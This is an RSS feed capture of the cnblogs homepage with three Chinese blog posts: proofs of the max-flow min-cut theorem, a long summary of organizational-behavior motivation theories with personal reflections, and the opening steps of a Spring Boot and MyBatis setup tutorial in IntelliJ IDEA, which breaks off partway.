<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>最小割最大流定理 - kgxpbqbyt</title>
<link>http://www.cnblogs.com/kgxw0430/p/10386674.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kgxw0430/p/10386674.html</guid>
<description>&lt;p&gt;定理一：&lt;br/&gt;　　如果f是网络中的一个流，CUT(S,T)是任意一个割，那么f的值等于正向割边的流量与负向割边的流量之差。&lt;br/&gt;证明：&lt;br/&gt;　　设X和Y是网络中的两个顶点集合，用f（X,Y）表示从X中的一个顶点指向Y的一个顶点的所有弧（弧尾在X中，弧头在Y中： ）的流量和。只需证明：f=f(S,T)-f(T,S) 即可。&lt;br/&gt;推论一：&lt;br/&gt;　　如果f是网络中的一个流，CUT(S,T)是一个割，那么f的值不超过割CUT(S,T)的容量。&lt;br/&gt;　　推论二：&lt;br/&gt;　　网络中的最大流不超过任何割的容量。&lt;br/&gt;定理二：&lt;br/&gt;　　在网络中，如果f是一个流，CUT (S,T)是一个割，且f的值等于割CUT(S,T)的容量，那么f是一个最大流， CUT(S,T)是一个最小割。&lt;br/&gt;证明：&lt;br/&gt;　　令割CUT（S,T）的容量为C，所以流f的流量也为C。假设另外的任意流f1，流量为c1，根据流量不超过割的容量，则c1&amp;lt;=c,所以f是最大流。 假设另外的任意割CUT（S1,T1），容量为c1，根据流量不超过割的容量，所以有c1&amp;gt;=c,故，CUT（S,T）是最小割 。&lt;/p&gt;
</description>
<pubDate>Fri, 15 Feb 2019 23:08:00 +0000</pubDate>
<dc:creator>kgxpbqbyt</dc:creator>
<og:description>定理一： 如果f是网络中的一个流，CUT(S,T)是任意一个割，那么f的值等于正向割边的流量与负向割边的流量之差。 证明： 设X和Y是网络中的两个顶点集合，用f（X,Y）表示从X中的一个顶点指向Y的一</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kgxw0430/p/10386674.html</dc:identifier>
</item>
<item>
<title>《组织行为学》--工作动机及个人感悟--工程师真实价值 - 超大的雪童子</title>
<link>http://www.cnblogs.com/yangsy0915/p/10386433.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yangsy0915/p/10386433.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;个人感悟&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;我们研究个人工作动机的目的，是能够更好地把握不同情境下的心态及情绪。同时，组织行为学本身也是能够帮助管理者对不同工作动机的成员有着激励的作用。但是《组织行为学》中，只是从工作效能和提高员工工作积极性的角度去分析及激发不同需求个体。&lt;/p&gt;
&lt;p&gt;　　那么从个体角度来说，我们是否确定了最终要的是什么呢？你最终想成为什么样的人？技术大神？架构师？管理人员？还是企业家。甚至技术大神又可再分为系统后台？前端？中间件？分布式？大数据？管理人员分为主导型？协作型？管理范畴？企业家又包含股东职责？董事长职责？的确，任何选择是没有错的。但是，当下的行为，是否贯穿过你整个人生的生命周期，从我最终要成为什么样的人的目标下，去分解每个阶段该做的事情。但是，目标不光是以事情以及各个阶段该去做的的事情这一个维度，还要去考虑包括分解 为人处世社交网络方面阶段的目标、思维体系建设目标、知识体系建设目标、行业个人影响力建设目标、团队管理目标、多学科融合目标等，直到分解到你当下做的事情。当然，对于组织中激励措施的到位与否也会直接影响个体的情绪和态度，也会因为公平机制，自以为自己做的比别人多，为什么得到的却没有那么多？ 以我个人的一个衡量标准，是价值，是你做的事情是否真真正正的为客户带来了价值。技术追求固然重要，同时我们会从自己完成的项目或技术中获得无上的成就感，但公司要盈利，以公司层面更看重公司花费了人力物力财力所创造的价值。&lt;/p&gt;
&lt;p&gt;　　那么这里不得不说到另外一种话题，以领导者的角度，我们工程师会抱怨，有些领导感觉什么都没干？为什么他是领导？以技术人的角度，应该是一个技术大神领导，也就是主导型领导来带领我们，是的，这样会有信服力，权威的存在。 但是，你是否有想过，任何人的存在都是有一定的意义的？我们把社会看成是一个分工协作的大组织，有一部分领导更注重于协作关系，也就是资源整合，你看不到的是这种类型领导们所做的包括人员协作管理，技能整合补缺，风险预判管理，多团队间协作，标准制度化设定，行业资源共赢，未来发展信息整合预判与决策。是真正拿到项目给大家去做的人，是整个系统体系中最重要的，需求承接与合作达成的重要阶段。 否则，就不会有我们工程师的项目存在了。&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;一、动机的基本特点&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　人们无论从事什么活动，总要受到动机的调节和支配。比如，工人在厂里做工，是因为他是有工作的动机；顾客去商店采购，是因为他有购买的动机。它表明一个人“为什么”去从事某种活动。那么，到底什么是动机呢？&lt;/p&gt;
&lt;p&gt;　　动机是指引起和维持个体的活动，并使活动朝向某一目标的内部心理过程或内部动力。人的各种活动都是在动机的指引下，并指向某一目标的。那么动机具有四个特点：&lt;/p&gt;
&lt;p&gt;　　（1）动机是人们从事某种活动的原因，是推动人们进行某种活动的内部动力。比如，择饮的活动是由饥、渴的动机激发出来的。没有这种动机，就不会产生相应的行为和活动。&lt;/p&gt;
&lt;p&gt;　　（2）在动机的支配下，个体的行为将指向一定的目标或对象。比如，在学习动机的支配下，人们可能去图书馆借书，或者去商店买书；&lt;/p&gt;
&lt;p&gt;　　（3）动机引发某种活动出现后，并不能也不会立即停止，而是继续发挥其作用，即维持已引起的活动，并使该活动朝向某一目标进行。&lt;/p&gt;
&lt;p&gt;　　（4）动机是一种内部心理过程，是一个“中间变量”，我们无法直接观察到它，有时个体甚至不一定能意识到它的存在，只有通过一个人“当时所处的情景及其行为表现”才能觉察或测量到这个人的动机，并给于解释。&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;二、动机与效果&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　动机的性质和强度决定了人们行为的方向和进程，并进一步影响到行为的效果。但是在现实生活中，常常能看到动机与效果不太一致的情况。例如，一个工作十分努力的员工，却在工作业绩上并不出色。这表明：动机与效果的关系还受到其他因素的影响，其中一项主要因素是个体的能力水平。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190215231103333-139714191.jpg&quot; alt=&quot;&quot; width=&quot;427&quot; height=&quot;283&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　此外，越来越多的研究者认为在这种关系中还应加入机会这一变量，即：绩效=f(能力 × 动机 × 机会）。在现实生活中，很容易找到这样的例子，即使一个能干而且想干的人，却因为一些客观因素制约了绩效水平。动机是影响行为效果的一个重要因素，但却不是唯一条件。当你在评价一名员工为什么没有取得他应该取得的绩效水平时，不要忘了看一看员工是否拥有足够的工具、设备、材料和供应？是否拥有有利的工作条件、热情帮助的同事、支持性的规章制度？是否拥有做出工作决定所需的充分信息、是否有充分的时间完成工作？&lt;/p&gt;
&lt;p&gt;　　动机是组织行为领域研究最多的一个课题。分为三大类：内容型动机理论、过程型动机理论、强化型动机理论。最后引入一个综合动机模型。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（1）内容型动机理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　解释人们为什么做出这样那样的行为，主要研究激发人们行为的各种动机因素。主要包括五种理论：马斯洛的需要层次理论，阿尔德弗的ERG理论、麦克莱兰德的三种需要理论，赫兹伯格的双因素理论，以及近年提出的内部动机和外部动机理论。&lt;/p&gt;
&lt;p&gt;　　　　1、需要层次理论---马斯洛的需要层次&lt;/p&gt;
&lt;p&gt; 　　　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190216002253044-685167427.jpg&quot; alt=&quot;&quot; width=&quot;560&quot; height=&quot;374&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　1、生理需要：指衣、食、住、行等能满足个体生存所必需的一切物质方面的需要。是人类最基本的需要。而且在推动人们行为方面有着强大的原动力。&lt;/p&gt;
&lt;p&gt;　　　　2、安全需要：指对生命安全、财产安全、职业安全和心理安全的需要。这类需要主要是对生理需求和身体安全的社会保障。&lt;/p&gt;
&lt;p&gt;　　　　3、社交需要：指个人归属于某一群体的需要，参与群体活动及交往的需要，以及对友谊、接纳和爱情的需要等。&lt;/p&gt;
&lt;p&gt;　　　　4、尊重需要：可分为两类，一类与内部尊重有关，例如自尊、自信、自主和成就感；另一类与外部尊重有关，例如地位、冗余、认可和关注。&lt;/p&gt;
&lt;p&gt;　　　　5、自我实现需要：这是最高层次的需要，指的是个体能充分发挥自身的潜能，实现个人的理想抱负，同时使自己不断成长、发展的那些需要。&lt;/p&gt;
&lt;p&gt;　　　　马斯洛认为，人们的这五种需要是按次序逐级上升的。当低一级的需要获得基本的满足后，下一层级的需要才会成为主导需要。虽然没有一种需要会得到完全、彻底的满足、但只要它大体上获得了满足，或者说获得了大部分的满足，就不再有激励作用了。低级需要是有限的，一旦得到满足就不再有激励作用。而高级需要则不同，它们往往不易得到满足，更不可能得到完全满足。不过，只有在高级需要的满足过程中，才能产生更巨大、更稳定、更持久的力量，成为决定人们行为的关键因素。&lt;/p&gt;
&lt;p&gt;　　　　那么如果你想激励某个人，根据马斯洛的需要理论，你就需要了解他目前处于哪个需要层次，然后重点满足这种需要以及在其以上的更高层次需要。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190216003059268-2139301761.jpg&quot; alt=&quot;&quot; width=&quot;873&quot; height=&quot;245&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（2）ERG理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　阿尔德弗在马斯洛学说的基础上提出了ERG理论，认为人类存在三类核心需要：生存需求、关系需求、成长需求。&lt;/p&gt;
&lt;p&gt;　　　　生存需求关注与满足生存的基本物质条件，它包括了马斯洛学说中的生理需要和安全需要两部分。&lt;/p&gt;
&lt;p&gt;　　　　关系需求是人们维持重要人际关系的愿望。要满足这些社会的和地位的愿望，就需要和其他人相互交往。&lt;/p&gt;
&lt;p&gt;　　　　成长需求指的是对于个人发展的内在愿望。&lt;/p&gt;
&lt;p&gt;　　　　同时ERG理论还有两个鲜明特点：&lt;/p&gt;
&lt;p&gt;　　　　1、强调多种需要可以同时并存。例如，一个人甚至可以在生存需要和关系需要均未获得满足的情况下，为了成长需要而工作，或者三种需要在同一时间共同起作用。&lt;/p&gt;
&lt;p&gt;　　　　2、ERG理论不仅指出了需要的层次的“满足--上升”趋势，也包括了一个“挫折--倒退”趋势。也就是说，当个体较高层次的需要受到挫折未能满足时，则较低层次的需要强度会增加。所以，挫折可以导致人们向较低层级需要的回归。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（3）成就、权利与亲和需要&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　哈佛大学教授麦克莱兰德认为个体身上存在这一三种基本需要：成就需要、权利需要、亲和需要。&lt;/p&gt;
&lt;p&gt;　　　　成就需要指的是追求卓越、争取成功的内驱力。&lt;/p&gt;
&lt;p&gt;　　　　全力需要指的是说服和影响别人以某种方式行为而不以其他方式行为的需要。&lt;/p&gt;
&lt;p&gt;　　　　亲和需要，则是在社会环境中与他人建立友好、亲近人际关系的愿望。&lt;/p&gt;
&lt;p&gt;　　　　有关成就需要的研究发现，高成就需要的人特征有下列特征：&lt;/p&gt;
&lt;p&gt;　　　　1、能积极在不利情境中冲破障碍、克服困难、全力以赴地完成困难的任务，看重自己的声誉；&lt;/p&gt;
&lt;p&gt;　　　　2、有明确的目标和较高的抱负水平，相信自己的技能，并坚信自己一定会成功。&lt;/p&gt;
&lt;p&gt;　　　　3、精力充沛，探新求异，对工作精益求精，以期达到尽善尽美的地步。&lt;/p&gt;
&lt;p&gt;　　　　4、选择工作伙伴以高能力为条件，而不是以交往的亲密关系为标准。&lt;/p&gt;
&lt;p&gt;　　　　高成就需要的人强烈渴望获得成功，追求个人成就感。他们不喜欢偶然性过高的赌博，因为从偶然的成功中他们得不到任何成就满足感。同样，他们也不喜欢胜算过高的任务，因为那样他们就感受不到成功的难得与可贵。他们喜欢的是那些需要经过一定努力才能实现的目标。&lt;/p&gt;
&lt;p&gt;　　　　如果一个国家所有的个体都追求个人成就感，总是渴望把事情做得一次比一次更好，那么会使国家经济水平繁荣与增长。也就是说，通过了解一个社会中其成员成就动机水平的高低，可以预测到社会经济与科技发展的速度快慢。&lt;/p&gt;
&lt;p&gt;　　　　但是研究发现，高权利需求的人热衷于承担责任，努力对他人施加影响，喜欢竞争激烈和能够带来地位的情景。比起工作本身，赢得对他人的影响，他们更倾向于关心自己的威望、获得地位、赢得对他人的影响。权利需要高的人能够得到更高的职位，晋升速度更快，并寻求更多的影响他人的机会。&lt;/p&gt;
&lt;p&gt;　　　　那么高亲和需要的人更看重与他人的联络，他们渴望得到他人的喜欢、认可、支持和合作，追求友爱。这样的人更喜欢合作环境而不是竞争环境，努力形成亲密的人际关系，渴望相互理解、彼此关怀。那么我们需要作出一些腿短和预测。&lt;/p&gt;
&lt;p&gt;　　　　第一，高成就需要更喜欢具有个人责任感，可以获得工作反馈和中等冒险程度的工作环境。不少证据一致表明，高成就者会工作积极性更高。他们在工作中得到的主要奖赏来自于工作本身，把工作视为生活的核心乐趣。&lt;/p&gt;
&lt;p&gt;　　　　第二、高成就需要者未必是以为优秀的管理者，尤其是对规模较大的组织而言。他们感兴趣的是自己如何做得更好，而不是如何影响其他人做得更好。&lt;/p&gt;
&lt;p&gt;　　　　第三、归属需要和权力需要与管理者的成功与否密切相关。最优秀的管理者拥有高权力需要和低归属感需要。实际上，高权力动机可能是管理效果的一个必要条件。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（4）双因素理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　赫兹伯格采用关键事件分析技术对员工的工作满意度问题，他发现有两大类因素影响着人们的工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190216005451421-1498666213.jpg&quot; alt=&quot;&quot; width=&quot;487&quot; height=&quot;393&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　导致工作满意的因素与导致工作不满意的因素是相互独立的。因此，管理者若努力在工作中消除不满意因素，则只能给工作场所带来和平气氛，却未必具有激励作用。要想激励人们积极从事工作，必须要重视与工作本身相关的因素或是可以直接带来结果的因素，即激励因素，如晋升机会、个人成长机会、认可、责任和成就。&lt;/p&gt;
&lt;p&gt;　　　　人们容易把功劳归因于自己，而把失败归因于外部环境因素。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（5）内部动机与外部动机理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　可划分为两大类：内部动机和外部动机。在组织环境中，存在许多外在条件，可以吸引和激励员工，成为推动他们积极工作的诱因。例如高报酬、高职位、和谐的同事关系、上司的奖赏等等，这些由外在力量激发而来的动机，成为外部动机。另一方面，个体的内部心理因素，如兴趣、爱好、好胜心、荣誉感、自我实现等等，在一定条件下，也可以成为推动员工积极活动的内部力量。&lt;/p&gt;
&lt;p&gt;　　　　折扣性原则，外部降级可能削弱了个体完成任务的内在动机。外在奖励越多，内部动机的效果就会越打折扣。&lt;/p&gt;
&lt;p&gt;　　　　但是认知失调理论告诉我们，人们有维持认知平衡的心理需要，一种欣慰的外在理由越多，相应的内在理由就会越少。无论是对于学习成果给予的物质奖励，还是对人们的道德行为强加的外在约束力，都会使人倾向于用外在理由来解释自己的行为，促使人们养成他律的人格。由于外在约束才强迫自己的行为符合道德规范的人，一旦外在约束失去，其行为也会自然地超出道德的轨道。在组织中不能只关注外部的奖励，更应创造环境满足人们的内部动机。那么，内部动机受那些因素影响呢？&lt;/p&gt;
&lt;p&gt;　　　　1、托马斯的内部动机模型&lt;/p&gt;
&lt;p&gt;　　　　　　他们真诚地关心自己的工作，他们寻找更好的办法解决问题，他们总是精力充沛，当作好工作时，他们获得了巅峰体验，有一种自我实现的感觉。托马斯指出内部动机包括以下几个方面：&lt;/p&gt;
&lt;p&gt;　　　　　　选择：个体能够选择对自己有意义的活动，并按照自己喜欢的方式完成他们。&lt;/p&gt;
&lt;p&gt;　　　　　　胜任：对于自己所选定的任务活动可以熟练完成，并由此而带来成就感。&lt;/p&gt;
&lt;p&gt;　　　　　　意义：个体可以追求有价值的任务目的，这一任务的意义深远。&lt;/p&gt;
&lt;p&gt;　　　　　　进步：个体感到在实现任务目标的过程中，自己可以获得重要的成长与发展。&lt;/p&gt;
&lt;p&gt;　　　　　　如果一项任务很有意义，则人们会因为把事件浪费在其他无意义的工作当中而恼火，他们完全被内在的任务所吸引，甚至达到朝思暮想的地步。当一项任务可以产生巅峰体验时，个体的典型反应是选择这项工作而不是其他工作。最后，进步使我们觉得所花费的时间和努力是值得的。你感到对任务很有热情，并愿意在这方面投入你的时间和精力。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（6）过程型动机理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　重点关注人的心理机制，研究人们如何做出不同的反应，又是如何看待动机过程的。其中包括三种理论：洛克的目标设置理论、亚当斯的公平理论、弗罗姆的期望理论。&lt;/p&gt;
&lt;p&gt;　　　　1、目标设置理论&lt;/p&gt;
&lt;p&gt;　　　　　　人们为了达到目标而工作是工作动机的主要激励源之一。通过给员工设定合适的目标，可以激励员工。我们可以得出一些结论：&lt;/p&gt;
&lt;p&gt;　　　　　　明确而具体的目标能够提高工作绩效；目标的具体化本身就是一种内在推动力。如果其他条件相同，那么又具体目标的个体会比没有目标或只有笼统的“尽力而为”目标的员工干得更好。&lt;/p&gt;
&lt;p&gt;　　　　　　困难的目标，如果能被人们接受，会比容易的目标带来更高的工作绩效。因为，一旦员工接受了一项艰巨任务，他就会投入更多的努力，直到获得一定的结果。&lt;/p&gt;
&lt;p&gt;　　　　　　在实现目标的过程中，有反馈比无反馈能够带来更高的工作绩效。因为反馈能帮助我们了解自己所做的和自己想做的之间是否存在差异。&lt;/p&gt;
&lt;p&gt;　　　　　　如果人们有机会参与目标的设置过程，则目标更有可能被员工们接受。&lt;/p&gt;
&lt;p&gt;　&lt;strong&gt;　（7）公平理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　在组织环境中，我们总会把自己的投入（努力、经历、教育、能力）和报酬（薪水水平、提升、认可）和其他人的投入--报酬进行比较。如果我们感到这种比率不相等时，就会体验到公平紧张感。如果我们感到自己报酬过低，则这种紧张感会产生愤怒；如果我们感到自己报酬过高，则这种紧张感会产生内疚。亚当斯认为，这种紧张状态激发了人们的动机，去采取行动纠正这种不公平。&lt;/p&gt;
&lt;p&gt;　　　　员工可以把自己与朋友、邻居、同事或其他组织中的成员相比较，也可以与自己过去的工作经历相比较。基于公平理论，当员工感到不公平时，你可以预计他们会采取以下几种方式：&lt;/p&gt;
&lt;p&gt;　　　　1、改变自己投入，如：不再像过去那样努力；&lt;/p&gt;
&lt;p&gt;　　　　2、改变自己产出，如：通过增加产量但降低质量的做法，来提高自己的工资。&lt;/p&gt;
&lt;p&gt;　　　　3、调整自我认知，如：我过去总认为我的工作属于中等水平，但现在我意识到自己比其他人都更努力。&lt;/p&gt;
&lt;p&gt;　　　　4、调整对他人认知，如：谁谁的工作并不像我以前认为的那样令人满意。&lt;/p&gt;
&lt;p&gt;　　　　5、更换参照对象，如：我可能不如我弟弟挣得多，因为我们已经不属于同一代人了，但我相比其他同学来说还算不错。&lt;/p&gt;
&lt;p&gt;　　　　6、离开该领域，如：辞职。&lt;/p&gt;
&lt;p&gt;　　　　近些年来的研究进一步扩展了公平的含义，提出公平不但包括分配公平，还应包括程序公平。分配公平指的是人们感到个人之见在报酬数量上的分配是否公平。程序公平是人们感到用来确定报酬分配的程序是否公平。有证据表明，分配公平对员工的满意感有很大影响，而程序公平更倾向于影响到员工的组织承诺、对上司的新人和离职意向。通过增加程序公平感，即使员工对薪水、晋升和其他报酬不满意时，他们也可能以积极的态度看待上司和组织。&lt;/p&gt;
&lt;p&gt;　　　　公平理论表明，大多数员工来说，动机不仅受到绝对报酬的影响，而且受到相对报酬的影响。但是同时还有一些关键问题不够明了，比如怎样量化投入和产出的各个要素？这些因素会随着时间的变化而变化？又会怎样变化？&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;（8）期望理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　一个人在工作绩效上所付出的努力，取决于他对这种行为能给自己带来某种结果的期望，以及这种结果对个人的吸引力。该理论关系如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190216023850897-1760901956.jpg&quot; alt=&quot;&quot; width=&quot;596&quot; height=&quot;177&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　首先是努力与绩效之间的关系，称之为期望。一个人认为自己通过某种程度的努力可以达到一定绩效水平的可能性多大。其实是绩效与奖励之间的关系，称之为工具性。定义为：一个人认为达到一定绩效水平同他想要获得的积极结果之间的联系如何。&lt;/p&gt;
&lt;p&gt;　　　　最后是奖励与个人目标关系之间的关系，称之为效价。也就是你预计的某种结果会为你带来的满意或不满意的程度。弗洛姆把动机作为推动个体做出绩效的驱动力。F的大小，取决于这三个因素之积：F=E×V×1&lt;/p&gt;
&lt;p&gt;　　　　1、如果个体付出了最大努力，能否在绩效评估当中表现出来？也就是说人们是否会相信“一分耕耘，一分收获”？遗憾的是，对很多员工来说，这一问题的答案是“否”。为什么？一种可能是员工的能力水平存在一定缺陷，因此，无论他多么努力工作也不可能成为高绩效者；另一种可能是，组织中绩效评估体系的设计是为了评估一些非绩效因素，如忠诚感、创造性或冒险性，这意味着，付出更多的努力并不必然带来更高的绩效评估结果。第三种可能是，员工感觉到上司不喜欢他，其结果是，他预计不管自己多努力，都不会得到良好的评估结果。员工动机水平低的原因之音，可能在于员工的认知。&lt;/p&gt;
&lt;p&gt;　　　　2、如果个体获得了良好的绩效结果，能否得到组织的奖励？许多员工认为，绩效--奖励之间的工具性关系并不明确。原因在于，组织除了绩效之外还会奖励其他许多东西。例如，当员工的薪水基于资历、人缘好、巴结领导等因素来确定时，员工很可能会认为绩效--奖励的工具性非常微弱，从而降低了努力工作的动机水平。&lt;/p&gt;
&lt;p&gt;　　　　最后，个体得到的组织奖励，对他是否有足够的吸引力？员工努力工作原本是希望获得晋升，但得到的却是加薪；或者员工希望得到一个更有趣和更富有挑战性的工作，但实际上仅得到几句表扬而已。遗憾的是，管理者可以自己支配的奖励十分有限，难以实现个性化奖励。另外一些管理者还错误的认为，所有员工都想得到同样的东西。因此，他们忽视了差别化奖励的激励作用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　（9）强化动机理论&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　　　他们认为，人的一切行为都是后天在环境中通过条件反射的方式建立和形成的，而动机则是由外部刺激引起的一种对行为的激发力量。在激发个体产生新行为或改变已有行为时，强化是一项必不可少的因素，它使外界刺激与学习者的反应之间建立起条件反射，并通过不断地重复而使二者的联系进一步加强和巩固。&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;三、动机的整合模型&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/820234/201902/820234-20190216025528276-2079585500.jpg&quot; alt=&quot;&quot; width=&quot;415&quot; height=&quot;330&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　首先要明确认识到，机会可以帮助也可以妨碍个人的努力。“个人努力”受到“个人目标”的影响。这与目标设置理论的观点相一致，目标--努力之间的联系表明目标对个体行为具有指导作用。&lt;/p&gt;
&lt;p&gt;　　如果一个员工感到努力和绩效之间、绩效和奖励之间、奖励和个人目标的满足之间存在着密切联系，那么他会非常努力地工作。ERG理论进一步解释这种关系，当个体由于工作绩效而获得的奖励可以满足个人的主导需要时，他就会表现出极高的动机水平和工作积极性，从而实现目标。但是对于高成就需要者来说，只要他们从事的工作能提供个人责任感、信息反馈、中等程度的冒险性，他们就会产生完成工作的内部驱动力。&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;四、目标管理&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　是在目标设置理论的基础上发展起来的，它强调员工参与对目标的设置工作，这些目标应该具有明确、可检验和可测量的特点。包括：目标具体性、参与决策、明确的时间限定，绩效反馈。&lt;/p&gt;
&lt;p&gt;　　第一，在目标中不能仅仅笼统地表明要削减成本、改善服务、提高质量、这些愿望必须要转化成可以测量和评价的具体目标。&lt;/p&gt;
&lt;p&gt;　　第二，目标不是由上级单方面确定然后分给下属的。运用共同参与决策的方式代替硬性规定的指标。&lt;/p&gt;
&lt;p&gt;　　第三，管理者和下属不仅要有明确的目标，而且要有完成目标的明确时间限定。&lt;/p&gt;
&lt;p&gt;　　第四，在实现目标的进程中，管理者要不断提供绩效反馈。比较现实的做法是，在检查工作进度时，管理者给予阶段性的定期评价。&lt;/p&gt;
&lt;p&gt;　　在制定目标时，如果对结果存在不切实际的期望、缺乏高层管理者的承诺，管理层物理或不愿根据目标的完成情况分配报酬时，目标管理的效果会大打折扣。&lt;/p&gt;
</description>
<pubDate>Fri, 15 Feb 2019 20:00:00 +0000</pubDate>
<dc:creator>超大的雪童子</dc:creator>
<og:description>个人感悟 我们研究个人工作动机的目的，是能够更好地把握不同情境下的心态及情绪。同时，组织行为学本身也是能够帮助管理者对不同工作动机的成员有着激励的作用。但是《组织行为学》中，只是从工作效能和提高员工工</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yangsy0915/p/10386433.html</dc:identifier>
</item>
<item>
<title>idea 搭建 SpringBoot  集成 mybatis - mon小胖</title>
<link>http://www.cnblogs.com/monxiaopang/p/10386624.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/monxiaopang/p/10386624.html</guid>
<description>


&lt;p&gt;编译器：IDEA2018.2.3&lt;/p&gt;
&lt;p&gt;环境：win10，jdk1.8，maven3.4&lt;/p&gt;
&lt;p&gt;数据库：mysql 5.7&lt;/p&gt;
&lt;p&gt;备注：截图较大，如果看不清，可以在图片上右键=》在新标签页中打开   查看高清大图哦╮(╯▽╰)╭&lt;/p&gt;
&lt;p&gt;一、打开IDEA新建项目&lt;/p&gt;
&lt;p&gt;1. 如果你是第一次使用IDEA，那么你需要配置你本地的maven，点击右下角 Configure，如已配置请忽略此步骤&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215230922182-214023118.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在下拉框中选择setting，然后如下图操作，选择自己本地的maven路径与maven配置文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215231512267-1040766851.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击OK&lt;/p&gt;
&lt;p&gt;2.新建项目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215231620301-267043597.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击Create New Project 后，弹出如下界面，选择Spring Initializer，然后可以使用编译器自带的JDK，也可以点击New，新建并使用自己本地目录下的JDK环境&lt;/p&gt;
&lt;p&gt;当然你也可以选择Maven，使用Maven搭建自己的环境，但相信我，前者更为便捷&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215231910661-1298705574.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;完成上述步骤，选择JDK之后，点击next，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215232213945-142196940.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里会提示我们输入一些项目信息，那么作为初学者，显然我们没有必要去较劲，请直接next，之后如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1094731/201902/1094731-20190215232406301-734237092.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里会为你准备许多开发时你需要用到的组件供你挑选，你尽管挑选你可能会用到的组件，然后打勾✔，编译器会在帮你创建项目时，在pom文件中替你写好这些组件需要用到的jar包，很贴心，有点小感动&lt;/p&gt;
&lt;p&gt;如果你只是构建一个SpringBoot，你可以什么都不选直接跳过这一步&lt;/p&gt;
